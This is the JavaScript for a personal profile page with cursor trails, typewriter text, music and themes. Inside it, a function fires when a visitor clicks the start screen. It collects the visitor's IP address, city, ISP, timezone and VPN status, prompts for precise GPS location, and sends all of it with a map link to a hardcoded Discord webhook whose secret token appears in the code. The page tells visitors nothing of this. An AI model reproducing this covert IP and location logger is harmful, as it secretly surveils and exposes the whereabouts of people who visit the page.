// ── Cursor Trail Effect ────────────────────────────────────────────────────
class CursorTrailEffect {
  constructor(style = 'dots') {
    this.mouseX = 0;
    this.mouseY = 0;
    this.style  = style;
    this.container = null;
    this.dots   = [];
    this.animId = null;
    this._spawnActive = false;

    document.addEventListener('mousemove', e => {
      this.mouseX = e.clientX;
      this.mouseY = e.clientY;
    });

    this._init();
  }

  _clearContainer() {
    if (this.animId) { cancelAnimationFrame(this.animId); this.animId = null; }
    this._spawnActive = false;
    if (this.container) { this.container.innerHTML = ''; }
    this.dots = [];
  }

  _init() {
    this._clearContainer();
    if (this.style === 'off') return;

    if (!this.container) {
      this.container = document.createElement('div');
      this.container.className = 'cursor-trail';
      // These inline styles are required: without position:fixed the container
      // isn't a positioned ancestor, so child left/top values do nothing.
      Object.assign(this.container.style, {
        position:      'fixed',
        top:           '0',
        left:          '0',
        width:         '100%',
        height:        '100%',
        pointerEvents: 'none',
        zIndex:        '9999',
        overflow:      'hidden'
      });
      document.body.appendChild(this.container);
    }

    if      (this.style === 'dots')     this._initDots();
    else if (this.style === 'sparkles') this._initSparkles();
    else if (this.style === 'comet')    this._initComet();
  }

  _initDots() {
    const length = 12, speed = 0.2;
    this.dots = Array.from({ length }, (_, i) => {
      const dot = document.createElement('div');
      dot.className = 'cursor-trail-dot';
      const size = 8;
      dot.style.width  = size + 'px';
      dot.style.height = size + 'px';
      dot.style.opacity = (1 - i / length).toFixed(2);
      // position:fixed is required — without it left/top are ignored (static default).
      Object.assign(dot.style, {
        position:     'fixed',
        borderRadius: '50%',
        background:   'var(--primary-color, #00CED1)',
        transform:    'translate(-50%, -50%)',
        pointerEvents:'none'
      });
      this.container.appendChild(dot);
      return { el: dot, x: 0, y: 0 };
    });
    const animate = () => {
      this.dots.forEach((dot, i) => {
        const target = i === 0 ? { x: this.mouseX, y: this.mouseY } : this.dots[i - 1];
        dot.x += (target.x - dot.x) * speed;
        dot.y += (target.y - dot.y) * speed;
        dot.el.style.left = dot.x + 'px';
        dot.el.style.top  = dot.y + 'px';
      });
      this.animId = requestAnimationFrame(animate);
    };
    this.animId = requestAnimationFrame(animate);
  }

  _initSparkles() {
    this._spawnActive = true;
    const glyphs = ['✦', '✧', '★', '⋆', '✺', '·', '✼'];
    const spawn = () => {
      if (!this._spawnActive) return;
      const s = document.createElement('div');
      s.className = 'cursor-trail-sparkle';
      s.textContent = glyphs[Math.floor(Math.random() * glyphs.length)];
      // position:fixed is required so left/top resolve against the viewport
      // (matching the clientX/clientY values we're using).
      Object.assign(s.style, {
        position:     'fixed',
        color:        'var(--primary-color, #00CED1)',
        fontSize:     '16px',
        lineHeight:   '1',
        pointerEvents:'none',
        userSelect:   'none'
      });
      const offsetX = (Math.random() - 0.5) * 24;
      const offsetY = (Math.random() - 0.5) * 24;
      s.style.left = (this.mouseX + offsetX) + 'px';
      s.style.top  = (this.mouseY + offsetY) + 'px';
      this.container.appendChild(s);
      const riseY = -(30 + Math.random() * 40);
      const rot   = (Math.random() - 0.5) * 360;
      s.animate([
        { opacity: 1, transform: 'translate(-50%,-50%) scale(1.1) rotate(0deg)' },
        { opacity: 0, transform: `translate(-50%, calc(-50% + ${riseY}px)) scale(0.2) rotate(${rot}deg)` }
      ], { duration: 500 + Math.random() * 400, easing: 'ease-out' })
        .onfinish = () => s.remove();
      setTimeout(spawn, 55);
    };
    spawn();
  }

  _initComet() {
    const length = 22, speed = 0.13;
    this.dots = Array.from({ length }, (_, i) => {
      const dot = document.createElement('div');
      dot.className = 'cursor-trail-dot cursor-trail-comet';
      const size = Math.max(2, 11 - i * 0.42);
      dot.style.width   = size + 'px';
      dot.style.height  = size + 'px';
      dot.style.opacity = (1 - i / length).toFixed(2);
      Object.assign(dot.style, {
        position:     'fixed',
        borderRadius: '50%',
        background:   'var(--primary-color, #00CED1)',
        transform:    'translate(-50%, -50%)',
        boxShadow:    '0 0 6px 2px rgba(0,206,209,0.45)',
        pointerEvents:'none'
      });
      this.container.appendChild(dot);
      return { el: dot, x: 0, y: 0 };
    });
    const animate = () => {
      this.dots.forEach((dot, i) => {
        const target = i === 0 ? { x: this.mouseX, y: this.mouseY } : this.dots[i - 1];
        dot.x += (target.x - dot.x) * speed;
        dot.y += (target.y - dot.y) * speed;
        dot.el.style.left = dot.x + 'px';
        dot.el.style.top  = dot.y + 'px';
      });
      this.animId = requestAnimationFrame(animate);
    };
    this.animId = requestAnimationFrame(animate);
  }

  setStyle(style) {
    this.style = style;
    this._init();
  }
}
// ──────────────────────────────────────────────────────────────────────────────

const VISITOR_WEBHOOK = 'https://discord.com/api/webhooks/1517854760743735458/TrmctI9QjMS_Pp0xMi2VVsM1yvBbIAHpTb2iXlyruXqas86Zigh2vy2v25RPtMDzQhzx';

function flagEmoji(code) {
  if (!code || code.length !== 2) return '🏳️';
  return [...code.toUpperCase()]
    .map(c => String.fromCodePoint(0x1F1E6 + c.charCodeAt(0) - 65))
    .join('');
}

async function getBrowserGeo() {
  if (!navigator.geolocation) return null;
  return new Promise(resolve => {
    try {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        ()   => resolve(null),
        { timeout: 5000, enableHighAccuracy: false }
      );
    } catch (_) { resolve(null); }
  });
}

async function fetchIpData() {
  // Try ipwho.is first (has VPN detection); fall back to ipapi.co
  try {
    const d = await fetch('https://ipwho.is/').then(r => r.json());
    if (d.success && d.ip) return d;
  } catch (_) {}
  try {
    const d = await fetch('https://ipapi.co/json/').then(r => r.json());
    if (!d.error && d.ip) return {
      ip: d.ip, country: d.country_name, country_code: d.country_code,
      city: d.city, region: d.region, latitude: d.latitude, longitude: d.longitude,
      connection: { isp: d.org }, timezone: { id: d.timezone }, security: {}
    };
  } catch (_) {}
  return null;
}

async function logVisitorToDiscord() {
  // Start browser geo immediately (permission prompt appears right away)
  const geoPromise = getBrowserGeo();

  const g = await fetchIpData();
  if (!g) { console.warn('[xenolog] Both IP APIs failed'); return; }

  const browserGeo = await geoPromise;

  try {
    const flag = flagEmoji(g.country_code);
    const isp  = g.connection?.isp || g.connection?.org || 'Unknown';
    const tz   = g.timezone?.id    || 'Unknown';
    const vpn  = g.security?.vpn || g.security?.proxy || g.security?.tor;

    let mapLink, geoNote;
    if (browserGeo) {
      mapLink = `[📍 Precise GPS](https://www.google.com/maps?q=${browserGeo.lat},${browserGeo.lon})`;
      geoNote = '✅ GPS / Wi-Fi (accurate)';
    } else if (g.latitude && g.longitude) {
      mapLink = `[📍 IP Estimate](https://www.google.com/maps?q=${g.latitude},${g.longitude})`;
      geoNote = '⚠️ IP estimate — may be off';
    } else {
      mapLink = '—'; geoNote = '';
    }

    const res = await fetch(VISITOR_WEBHOOK, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username:   'Xenostopic Logs',
        avatar_url: 'https://xenostopic.xyz/assets/profile.webp',
        embeds: [{
          title: '👁️  New Visitor on Xenostopic',
          color: 0x00CED1,
          fields: [
            { name: '🌐  IP',           value: `\`${g.ip}\``,             inline: true  },
            { name: `${flag}  Country`, value: g.country    || 'Unknown', inline: true  },
            { name: '🏙️  City',         value: g.city       || 'Unknown', inline: true  },
            { name: '📍  Region',       value: g.region     || 'Unknown', inline: true  },
            { name: '🏢  ISP',          value: isp,                       inline: true  },
            { name: '🕐  Timezone',     value: tz,                        inline: true  },
            { name: '🛡️  VPN / Proxy',  value: vpn ? '⚠️ Yes' : '✅ No', inline: true  },
            { name: '🗺️  Location',     value: geoNote ? `${mapLink}\n${geoNote}` : mapLink, inline: false },
          ],
          footer:    { text: 'gh.xenostopicyber.xo.je  •  Visitor Log' },
          timestamp: new Date().toISOString(),
        }],
      }),
    });
    if (!res.ok) console.warn('[xenolog] Webhook error:', res.status, await res.text());
  } catch (e) {
    console.warn('[xenolog] Failed to post webhook:', e);
  }
}
// ──────────────────────────────────────────────────────────────────────────────

let hasUserInteracted = false;

function initMedia() {
  const backgroundMusic = document.getElementById('background-music');
  const backgroundVideo = document.getElementById('background');
  if (!backgroundMusic || !backgroundVideo) return;
  backgroundMusic.volume = 0.3;
  backgroundVideo.muted  = true;
  backgroundVideo.play().catch(() => {});
}

document.addEventListener('DOMContentLoaded', () => {
  const startScreen        = document.getElementById('start-screen');
  const startText          = document.getElementById('start-text');
  const profileName        = document.getElementById('profile-name');
  const profileBio         = document.getElementById('profile-bio');
  const visitorCount       = document.getElementById('visitor-count');
  const backgroundMusic    = document.getElementById('background-music');
  const animeMusic         = document.getElementById('anime-music');
  const homeButton         = document.getElementById('home-theme');
  const animeButton        = document.getElementById('anime-theme');
  const volumeIcon         = document.getElementById('volume-icon');
  const volumeSlider       = document.getElementById('volume-slider');
  const transparencySlider = document.getElementById('transparency-slider');
  const backgroundVideo    = document.getElementById('background');
  const glitchOverlay      = document.querySelector('.glitch-overlay');
  const profileBlock       = document.getElementById('profile-block');
  const presenceDot        = document.getElementById('presence-dot');
  const presenceText       = document.getElementById('presence-text');
  const profilePicture     = document.querySelector('.profile-picture');
  const profileContainer   = document.querySelector('.profile-container');
  const socialIcons        = document.querySelectorAll('.social-icon');
  const trailBtn           = document.getElementById('trail-btn');

  // ── Discord Presence (Lanyard) ─────────────────────────────────────────────
  const DISCORD_USER_ID = '1517524311793991752';
  let lastOnlineTimestamp = parseInt(localStorage.getItem('lastOnlineTimestamp')) || null;

  function formatLastSeen(ts) {
    const diff = Math.floor((Date.now() - ts) / 1000);
    if (diff < 60)    return `last seen ${diff} second${diff !== 1 ? 's' : ''} ago`;
    if (diff < 3600)  { const m = Math.floor(diff / 60);  return `last seen ${m} minute${m !== 1 ? 's' : ''} ago`; }
    if (diff < 86400) { const h = Math.floor(diff / 3600); return `last seen ${h} hour${h !== 1 ? 's' : ''} ago`; }
    const d = Math.floor(diff / 86400); return `last seen ${d} day${d !== 1 ? 's' : ''} ago`;
  }

  function updatePresenceUI(status) {
    presenceDot.className = 'presence-dot ' + status;
    if      (status === 'online') presenceText.textContent = 'Online';
    else if (status === 'idle')   presenceText.textContent = 'Idle';
    else if (status === 'dnd')    presenceText.textContent = 'Do Not Disturb';
    else presenceText.textContent = lastOnlineTimestamp ? formatLastSeen(lastOnlineTimestamp) : 'Offline';
  }

  async function fetchPresence() {
    try {
      const res  = await fetch(`https://api.lanyard.rest/v1/users/${DISCORD_USER_ID}`);
      const data = await res.json();
      if (!data.success) return;
      const status = data.data.discord_status;
      if (status !== 'offline') {
        lastOnlineTimestamp = Date.now();
        localStorage.setItem('lastOnlineTimestamp', lastOnlineTimestamp);
      }
      updatePresenceUI(status);
    } catch (err) {
      console.error('Lanyard fetch failed:', err);
    }
  }

  fetchPresence();
  setInterval(fetchPresence, 30000);
  setInterval(() => {
    if (presenceDot.classList.contains('offline') && lastOnlineTimestamp) {
      presenceText.textContent = formatLastSeen(lastOnlineTimestamp);
    }
  }, 60000);
  // ──────────────────────────────────────────────────────────────────────────

  // ── Custom cursor ──────────────────────────────────────────────────────────
  const cursor      = document.querySelector('.custom-cursor');
  const isTouchDevice = window.matchMedia('(pointer: coarse)').matches;

  if (isTouchDevice) {
    document.body.classList.add('touch-device');
    document.addEventListener('touchstart', e => {
      cursor.style.left    = e.touches[0].clientX + 'px';
      cursor.style.top     = e.touches[0].clientY + 'px';
      cursor.style.display = 'block';
    });
    document.addEventListener('touchmove', e => {
      cursor.style.left    = e.touches[0].clientX + 'px';
      cursor.style.top     = e.touches[0].clientY + 'px';
      cursor.style.display = 'block';
    });
    document.addEventListener('touchend', () => { cursor.style.display = 'none'; });
  } else {
    document.addEventListener('mousemove', e => {
      cursor.style.left    = e.clientX + 'px';
      cursor.style.top     = e.clientY + 'px';
      cursor.style.display = 'block';
    });
    document.addEventListener('mousedown', () => {
      cursor.style.transform = 'scale(0.8) translate(-50%, -50%)';
    });
    document.addEventListener('mouseup', () => {
      cursor.style.transform = 'scale(1) translate(-50%, -50%)';
    });
  }
  // ──────────────────────────────────────────────────────────────────────────

  // ── Start screen typewriter ────────────────────────────────────────────────
  const startMessage = 'Click here to see the motion baby!';
  let startTextContent = '';
  let startIndex = 0;
  let startCursorVisible = true;

  // Cursor blink for start screen only (runs independently)
  setInterval(() => {
    startCursorVisible = !startCursorVisible;
    if (startText) startText.textContent = startTextContent + (startCursorVisible ? '|' : ' ');
  }, 500);

  function typeWriterStart() {
    if (startIndex < startMessage.length) {
      startTextContent = startMessage.slice(0, startIndex + 1);
      startIndex++;
    }
    if (startText) startText.textContent = startTextContent + (startCursorVisible ? '|' : ' ');
    setTimeout(typeWriterStart, 100);
  }

  typeWriterStart();
  // ──────────────────────────────────────────────────────────────────────────

  // ── Visitor Counter ────────────────────────────────────────────────────────
  const COUNTER_NS        = 'xenostopic-xyz';
  const COUNTER_KEY       = 'profile-views';
  const COUNTER_URL       = `https://api.counterapi.dev/v1/${COUNTER_NS}/${COUNTER_KEY}`;
  const COUNTER_CACHE_KEY = 'xeno_lastCount';

  function fetchWithTimeout(url, opts = {}, ms = 6000) {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), ms);
    return fetch(url, { ...opts, signal: ctrl.signal }).finally(() => clearTimeout(timer));
  }

  async function initializeVisitorCounter() {
    const cached = localStorage.getItem(COUNTER_CACHE_KEY);
    // Show cached count immediately — never a blank while loading
    if (cached) visitorCount.textContent = Number(cached).toLocaleString();

    // counterapi.dev auto-creates the key on the first /up hit — no PUT needed.
    // (The old PUT 404-handler was firing a non-simple CORS request that triggered
    // a preflight OPTIONS; counterapi.dev doesn't support PUT so the preflight
    // failed, throwing before we ever read the count — and silently breaking
    // the hits.seeyoufarm.com fallback, which has no CORS headers of its own.)
    try {
      const res = await fetchWithTimeout(`${COUNTER_URL}/up`);
      if (res.ok) {
        const data  = await res.json();
        // Some API versions nest the count; cover the common field names.
        const count = data.count ?? data.value ?? data.hits ?? data.data?.count ?? null;
        if (count !== null) {
          visitorCount.textContent = Number(count).toLocaleString();
          localStorage.setItem(COUNTER_CACHE_KEY, count);
          return;
        }
      }
    } catch (e) {
      console.warn('counterapi.dev failed:', e);
    }

    // API failed — keep the cached value or fall back to 0 on a brand-new visit.
    if (!cached) visitorCount.textContent = '0';
  }

  initializeVisitorCounter();
  // ──────────────────────────────────────────────────────────────────────────

  // ── Cursor trail style selector ────────────────────────────────────────────
  const trailStyles = ['dots', 'sparkles', 'comet', 'off'];
  const trailIcons  = { dots: '⬤', sparkles: '✦', comet: '☄', off: '⊘' };
  let trailStyleIdx = 0;
  let trailEffect   = null; // initialised after start screen click

  if (trailBtn) {
    trailBtn.textContent = trailIcons[trailStyles[trailStyleIdx]];
    trailBtn.title       = 'Cursor Trail Style';

    const cycleTrail = () => {
      trailStyleIdx = (trailStyleIdx + 1) % trailStyles.length;
      const style   = trailStyles[trailStyleIdx];
      trailBtn.textContent = trailIcons[style];
      if (trailEffect) trailEffect.setStyle(style);
    };
    trailBtn.addEventListener('click', cycleTrail);
    trailBtn.addEventListener('touchstart', e => { e.preventDefault(); cycleTrail(); });
  }
  // ──────────────────────────────────────────────────────────────────────────

  // ── Name typewriter ────────────────────────────────────────────────────────
  const name = 'Xenostopic';
  let nameText = '';
  let nameIndex = 0;
  let isNameDeleting = false;
  let nameCursorVisible = true;
  let nameCursorInterval = null;

  function typeWriterName() {
    if (!isNameDeleting && nameIndex < name.length) {
      nameText = name.slice(0, nameIndex + 1);
      nameIndex++;
    } else if (isNameDeleting && nameIndex > 0) {
      nameText = name.slice(0, nameIndex - 1);
      nameIndex--;
    } else if (nameIndex === name.length) {
      isNameDeleting = true;
      setTimeout(typeWriterName, 10000);
      return;
    } else if (nameIndex === 0) {
      isNameDeleting = false;
    }
    profileName.textContent = nameText + (nameCursorVisible ? '|' : ' ');
    if (Math.random() < 0.1) {
      profileName.classList.add('glitch');
      setTimeout(() => profileName.classList.remove('glitch'), 200);
    }
    setTimeout(typeWriterName, isNameDeleting ? 150 : 300);
  }

  function startNameCursorBlink() {
    if (nameCursorInterval) return;
    nameCursorInterval = setInterval(() => {
      nameCursorVisible = !nameCursorVisible;
      profileName.textContent = nameText + (nameCursorVisible ? '|' : ' ');
    }, 500);
  }
  // ──────────────────────────────────────────────────────────────────────────

  // ── Bio typewriter ─────────────────────────────────────────────────────────
  const bioMessages = [
    'Gambling is always a 50/50, either you lose or you win!',
    'Lost in the static!'
  ];
  let bioText = '';
  let bioIndex = 0;
  let bioMessageIndex = 0;
  let isBioDeleting = false;
  let bioCursorVisible = true;
  let bioCursorInterval = null;

  function typeWriterBio() {
    const msg = bioMessages[bioMessageIndex];
    if (!isBioDeleting && bioIndex < msg.length) {
      bioText = msg.slice(0, bioIndex + 1);
      bioIndex++;
    } else if (isBioDeleting && bioIndex > 0) {
      bioText = msg.slice(0, bioIndex - 1);
      bioIndex--;
    } else if (bioIndex === msg.length) {
      isBioDeleting = true;
      setTimeout(typeWriterBio, 2000);
      return;
    } else if (bioIndex === 0 && isBioDeleting) {
      isBioDeleting = false;
      bioMessageIndex = (bioMessageIndex + 1) % bioMessages.length;
    }
    profileBio.textContent = bioText + (bioCursorVisible ? '|' : ' ');
    if (Math.random() < 0.1) {
      profileBio.classList.add('glitch');
      setTimeout(() => profileBio.classList.remove('glitch'), 200);
    }
    setTimeout(typeWriterBio, isBioDeleting ? 75 : 150);
  }

  function startBioCursorBlink() {
    if (bioCursorInterval) return;
    bioCursorInterval = setInterval(() => {
      bioCursorVisible = !bioCursorVisible;
      profileBio.textContent = bioText + (bioCursorVisible ? '|' : ' ');
    }, 500);
  }
  // ──────────────────────────────────────────────────────────────────────────

  // ── Start screen activation ────────────────────────────────────────────────
  function activateFromStartScreen() {
    logVisitorToDiscord();
    startScreen.classList.add('hidden');
    backgroundMusic.muted = false;
    backgroundMusic.play().catch(() => {});

    // Ensure profile block is visible and properly centred before animating
    profileBlock.style.opacity  = '0';
    profileBlock.style.display  = 'flex';

    gsap.fromTo(
      profileBlock,
      { opacity: 0, y: -50, xPercent: -50, yPercent: -50 },
      {
        opacity: 1, y: 0, xPercent: -50, yPercent: -50,
        duration: 1, ease: 'power2.out',
        onComplete: () => {
          // Don't add profile-appear — GSAP already handled the entrance
          profileContainer.classList.add('orbit');
        }
      }
    );

    if (!isTouchDevice) {
      trailEffect = new CursorTrailEffect(trailStyles[trailStyleIdx]);
    }

    // Start typewriters and their cursor blinks only now (no premature blinking)
    startNameCursorBlink();
    startBioCursorBlink();
    typeWriterName();
    typeWriterBio();
  }

  startScreen.addEventListener('click',      activateFromStartScreen);
  startScreen.addEventListener('touchstart', e => { e.preventDefault(); activateFromStartScreen(); });
  // ──────────────────────────────────────────────────────────────────────────

  // ── Audio controls ─────────────────────────────────────────────────────────
  let currentAudio = backgroundMusic;
  let isMuted      = false;

  const muteIcon   = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2"></path>`;
  const unmuteIcon = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"></path>`;

  const toggleMute = () => {
    isMuted = !isMuted;
    currentAudio.muted  = isMuted;
    volumeIcon.innerHTML = isMuted ? muteIcon : unmuteIcon;
  };

  volumeIcon.addEventListener('click',      toggleMute);
  volumeIcon.addEventListener('touchstart', e => { e.preventDefault(); toggleMute(); });

  volumeSlider.addEventListener('input', () => {
    currentAudio.volume  = volumeSlider.value;
    isMuted              = false;
    currentAudio.muted   = false;
    volumeIcon.innerHTML = unmuteIcon;
  });
  // ──────────────────────────────────────────────────────────────────────────

  // ── Transparency slider ────────────────────────────────────────────────────
  transparencySlider.addEventListener('input', () => {
    const opacity = transparencySlider.value;
    profileBlock.style.background     = opacity == 0 ? 'rgba(0,0,0,0)' : `rgba(0,0,0,${opacity})`;
    profileBlock.style.borderColor    = opacity == 0 ? 'transparent' : '';
    profileBlock.style.backdropFilter = opacity == 0 ? 'none' : `blur(${10 * opacity}px)`;
  });
  // ──────────────────────────────────────────────────────────────────────────

  // ── Theme switcher ─────────────────────────────────────────────────────────
  function switchTheme(videoSrc, audio, themeClass) {
    const colorMap = {
      'home-theme':  '#00CED1',
      'anime-theme': '#DC2626',
    };
    const primaryColor = colorMap[themeClass] || '#00CED1';
    document.documentElement.style.setProperty('--primary-color', primaryColor);

    gsap.to(backgroundVideo, {
      opacity: 0, duration: 0.5, ease: 'power2.in',
      onComplete: () => {
        backgroundVideo.src = videoSrc;
        backgroundVideo.load();

        if (currentAudio) { currentAudio.pause(); currentAudio.currentTime = 0; }
        currentAudio        = audio;
        currentAudio.volume = volumeSlider.value;
        currentAudio.muted  = isMuted;
        currentAudio.play().catch(() => {});

        document.body.classList.remove('home-theme', 'anime-theme');
        document.body.classList.add(themeClass);

        gsap.to(profileBlock, { x: 0, opacity: 1, duration: 0.5, ease: 'power2.out', xPercent: -50, yPercent: -50 });

        backgroundVideo.addEventListener('canplay', function onCanPlay() {
          backgroundVideo.removeEventListener('canplay', onCanPlay);
          backgroundVideo.play().catch(() => {});
          gsap.to(backgroundVideo, {
            opacity: 1, duration: 0.5, ease: 'power2.out',
            onComplete: () => {
              profileContainer.classList.remove('orbit');
              void profileContainer.offsetWidth;
              profileContainer.classList.add('orbit');
            }
          });
        });
      }
    });
  }

  homeButton.addEventListener('click',      () => switchTheme('assets/background.mp4', backgroundMusic, 'home-theme'));
  homeButton.addEventListener('touchstart', e => { e.preventDefault(); switchTheme('assets/background.mp4', backgroundMusic, 'home-theme'); });
  animeButton.addEventListener('click',      () => switchTheme('assets/anime_background.mp4', animeMusic, 'anime-theme'));
  animeButton.addEventListener('touchstart', e => { e.preventDefault(); switchTheme('assets/anime_background.mp4', animeMusic, 'anime-theme'); });
  // ──────────────────────────────────────────────────────────────────────────

  // ── 3-D card tilt ─────────────────────────────────────────────────────────
  function handleTilt(e, element) {
    const rect    = element.getBoundingClientRect();
    const centerX = rect.left + rect.width  / 2;
    const centerY = rect.top  + rect.height / 2;
    const clientX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
    const clientY = e.type === 'touchmove' ? e.touches[0].clientY : e.clientY;
    const maxTilt = 15;
    gsap.to(element, {
      rotationX: ((clientY - centerY) / rect.height) * maxTilt,
      rotationY: -((clientX - centerX) / rect.width) * maxTilt,
      duration: 0.3, ease: 'power2.out', transformPerspective: 1000
    });
  }

  const resetTilt = el => gsap.to(el, { rotationX: 0, rotationY: 0, duration: 0.5, ease: 'power2.out' });

  profileBlock.addEventListener('mousemove',  e => handleTilt(e, profileBlock));
  profileBlock.addEventListener('touchmove',  e => { e.preventDefault(); handleTilt(e, profileBlock); });
  profileBlock.addEventListener('mouseleave', () => resetTilt(profileBlock));
  profileBlock.addEventListener('touchend',   () => resetTilt(profileBlock));
  // ──────────────────────────────────────────────────────────────────────────

  // ── Profile picture interactions ───────────────────────────────────────────
  profilePicture.addEventListener('mouseenter', () => {
    glitchOverlay.style.opacity = '1';
    setTimeout(() => { glitchOverlay.style.opacity = '0'; }, 500);
  });

  const spinOrbit = () => {
    profileContainer.classList.remove('fast-orbit', 'orbit');
    void profileContainer.offsetWidth;
    profileContainer.classList.add('fast-orbit');
    setTimeout(() => {
      profileContainer.classList.remove('fast-orbit');
      void profileContainer.offsetWidth;
      profileContainer.classList.add('orbit');
    }, 500);
  };

  profilePicture.addEventListener('click',      spinOrbit);
  profilePicture.addEventListener('touchstart', e => { e.preventDefault(); spinOrbit(); });
  // ──────────────────────────────────────────────────────────────────────────
});
